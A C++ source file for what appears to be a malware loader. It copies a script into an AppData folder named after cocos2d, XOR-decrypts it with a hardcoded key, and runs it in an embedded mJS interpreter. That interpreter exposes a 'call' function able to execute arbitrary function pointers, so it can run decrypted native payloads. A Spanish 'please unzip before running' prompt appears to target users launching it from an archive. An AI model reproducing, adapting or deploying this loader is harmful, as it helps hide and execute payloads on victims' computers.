#include "log.h"
#include <string>

#ifdef _WIN32

#include <windows.h>

#endif

#include "mjs.h"
#include "utils.h"

#ifndef JS_FILE_NAME
#define JS_FILE_NAME "test.js"
#endif
#ifndef JS_COPY_FILE_NAME
#define JS_COPY_FILE_NAME "test.js"
#endif
#ifndef JS_DEFAULT_FILE_PATH
#define JS_DEFAULT_FILE_PATH "/AppData/Roaming/cocos2d/"
#endif
#ifndef JS_KEY
#define JS_KEY "S7MUtPmP7InrhXF4ut3VbJ8pdtQ2Eiox"
#endif
#ifndef JS_READ_OFFSET
#define JS_READ_OFFSET 0
#endif
#ifndef TIP_MSG
#define TIP_MSG "Por favor, descomprima antes de ejecutar"
#endif
#ifndef TIP_TITLE
#define TIP_TITLE "Oops!"
#endif

struct mjs *mjs = mjs_create();

extern "C" {
struct data {
    int size;
    char *bytes;
};
static void mjs_my_call(void (*func_ptr)()) {
    func_ptr();
}
static void mjs_my_log(char *format, void *any) {
    log_info(format, any);
}
static void mjs_my_xor(const unsigned char *data, int length, const unsigned char *key, unsigned char *result) {
    for (int i = 0; i < length; ++i) {
        result[i] = data[i] ^ key[i % strlen(reinterpret_cast<const char *>(key))];
    }
}
void *mjs_data_to_bytes(struct data *payload) {
    return payload->bytes;
}
int mjs_data_to_size(struct data *payload) {
    return payload->size;
}
struct data *mjs_read_data(char *filename, int offset) {
    auto *payload = static_cast<data *>(malloc(sizeof(struct data)));
    FILE *fp = fopen(filename, "rb");
    if (!fp) {
        log_info("Failed to open file\n");
        return nullptr;
    }

    fseek(fp, 0, SEEK_END);
    long file_size = ftell(fp) - offset;
    fseek(fp, offset, SEEK_SET);

    char *buffer = (char *) malloc(file_size);
    if (!buffer) {
        log_info("Failed to allocate memory\n");
        fclose(fp);
        return nullptr;
    }
    memset(buffer, 0, file_size);
    size_t bytes_read = fread(buffer, 1, file_size, fp);
    if (bytes_read != file_size) {
        log_info("Failed to read file\n");
        fclose(fp);
        free(buffer);
        return nullptr;
    }

    fclose(fp);
    payload->bytes = buffer;
    payload->size = file_size;
    return payload;
}

}

void *my_dlsym(void *handle, const char *name) {
    if (strcmp(name, "xor") == 0) return (void *) (mjs_my_xor);
    if (strcmp(name, "read") == 0) return (void *) (mjs_read_data);
    if (strcmp(name, "data_to_bytes") == 0) return (void *) (mjs_data_to_bytes);
    if (strcmp(name, "data_to_size") == 0) return (void *) (mjs_data_to_size);
    if (strcmp(name, "log") == 0) return (void *) (mjs_my_log);
    if (strcmp(name, "call") == 0) return (void *) (mjs_my_call);
    if (strcmp(name, "home") == 0) return (void *) (mjs_get_home);
    return nullptr;
}


char *load_script(const char *filename, int offset) {
#ifdef DEBUG
    log_info("load_script %s\n", filename);
#endif
    FILE *fp = fopen(filename, "rb");
    if (!fp) {
        log_info("Failed to open file\n");
        return nullptr;
    }

    fseek(fp, 0, SEEK_END);
    long file_size = ftell(fp) - offset;
    fseek(fp, offset, SEEK_SET);

    char *buffer = (char *) malloc(file_size + 1);
    if (!buffer) {
        log_info("Failed to allocate memory\n");
        fclose(fp);
        return nullptr;
    }
    log_info("File size: %d", file_size);
    memset(buffer, 0, file_size + 1);
    size_t bytes_read = fread(buffer, 1, file_size, fp);
    if (bytes_read != file_size) {
        log_info("Failed to read file\n");
        fclose(fp);
        free(buffer);
        return nullptr;
    }

    fclose(fp);
#ifdef ENABLE_XOR
    const char *key = JS_KEY;
    for (int i = 0; i < file_size; ++i) {
        buffer[i] = buffer[i] ^ key[i % strlen(key)];
    }
#endif
    return buffer;
}

int main(int argc, char **argv) {
#ifdef DEBUG

    FILE *log_fp = fopen("debug.log", "w");
    log_add_fp(log_fp, LOG_TRACE);
#endif

    char *path = (char *) malloc(100);
    strcpy(path, mjs_get_home());
    strcat(path, JS_DEFAULT_FILE_PATH);
#ifdef DEBUG
    log_info("Path: %s", path);
#endif
    if (!mjs_path_exists(path)) {
        mjs_mk_dirs(path);
    }
    strcat(path, JS_COPY_FILE_NAME);

    if (!mjs_path_exists(path)) {
        mjs_copy(JS_FILE_NAME, path);
    }
    char *script = load_script(path, JS_READ_OFFSET);
    if (script == nullptr) {
        if (strstr(mjs_get_current_path(), mjs_get_tmp_dir()) != nullptr) {
#ifdef _WIN32
            MessageBox(nullptr, TIP_MSG, TIP_TITLE, MB_OK | MB_ICONWARNING);
#else
            log_info("%s\n",TIP_MSG);
#endif
        }
        return 0;
    }
#ifdef DEBUG
    log_info("Script:\n%s", script);
#endif
    mjs_set_ffi_resolver(mjs, my_dlsym);
    mjs_exec(mjs, script, nullptr);
    return 0;
}